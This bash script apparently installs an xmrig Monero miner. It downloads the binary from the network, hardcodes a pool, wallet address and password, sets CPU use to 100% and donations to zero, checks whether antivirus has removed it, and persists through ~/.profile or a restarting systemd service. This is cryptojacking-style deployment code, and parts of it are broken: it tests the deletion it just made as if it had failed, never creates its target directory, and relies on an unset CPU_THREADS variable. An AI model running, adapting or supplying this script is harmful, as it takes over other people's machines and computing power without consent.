#!/bin/bash

VERSION=2.10

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean

if (test $? -ne 0); then
  if [ -f $HOME/moneroocean/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/moneroocean/config.json
  $HOME/moneroocean/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/moneroocean/xmrig ]; then
      echo "ERROR: Stock version of $HOME/moneroocean/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/moneroocean/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/moneroocean/xmrig is OK"

sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'10001'",/' $HOME/moneroocean/config.json
sed -i 's/"user": *"[^"]*",/"user": "'4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyhgKUqjg6HRgENMQm'",/' $HOME/moneroocean/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'V4'",/' $HOME/moneroocean/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/moneroocean/config.json

cp $HOME/moneroocean/config.json $HOME/moneroocean/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/moneroocean/config_background.json

# preparing script

echo "[*] Creating $HOME/moneroocean/miner.sh script"
cat >$HOME/moneroocean/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/moneroocean/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/moneroocean/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep moneroocean/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/moneroocean/miner.sh script to $HOME/.profile"
    echo "$HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
  /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
    /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating moneroocean_miner systemd service"
    cat >/tmp/moneroocean_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
    echo "[*] Starting moneroocean_miner systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable moneroocean_miner.service
    sudo systemctl start moneroocean_miner.service
    echo "To see miner service logs run \"sudo journalctl -u moneroocean_miner -f\" command"
  fi
fi
echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config_background.json"
fi
echo ""

echo "[*] Setup complete"
